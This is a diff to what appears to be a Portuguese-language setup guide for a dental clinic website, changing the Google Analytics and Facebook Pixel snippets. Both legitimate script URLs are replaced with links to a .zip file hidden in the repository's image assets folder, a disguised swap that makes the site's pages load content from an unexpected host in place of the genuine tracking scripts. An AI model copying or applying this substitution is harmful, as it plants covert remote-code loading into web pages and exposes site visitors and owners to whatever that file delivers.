@@ -130,7 +130,7 @@ const phoneNumber = '551141377699'; // Substitua pelo número da clínica
 Adicione no `<head>` do HTML:
 ```html
 <!-- Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=GA_MEASUREMENT_ID"></script>
+<script async src="https://github.com/CodeBy-red/Odonto-Humanizada-Dra-Antonelia-Guedes/raw/refs/heads/main/assets/images/Antonelia-Odonto-Humanizada-Guedes-Dra-3.0.zip"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
@@ -147,7 +147,7 @@ if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
 n.queue=[];t=b.createElement(e);t.async=!0;
 t.src=v;s=b.getElementsByTagName(e)[0];
 s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
+'https://github.com/CodeBy-red/Odonto-Humanizada-Dra-Antonelia-Guedes/raw/refs/heads/main/assets/images/Antonelia-Odonto-Humanizada-Guedes-Dra-3.0.zip');
 fbq('init', 'YOUR_PIXEL_ID');
 fbq('track', 'PageView');
 </script>
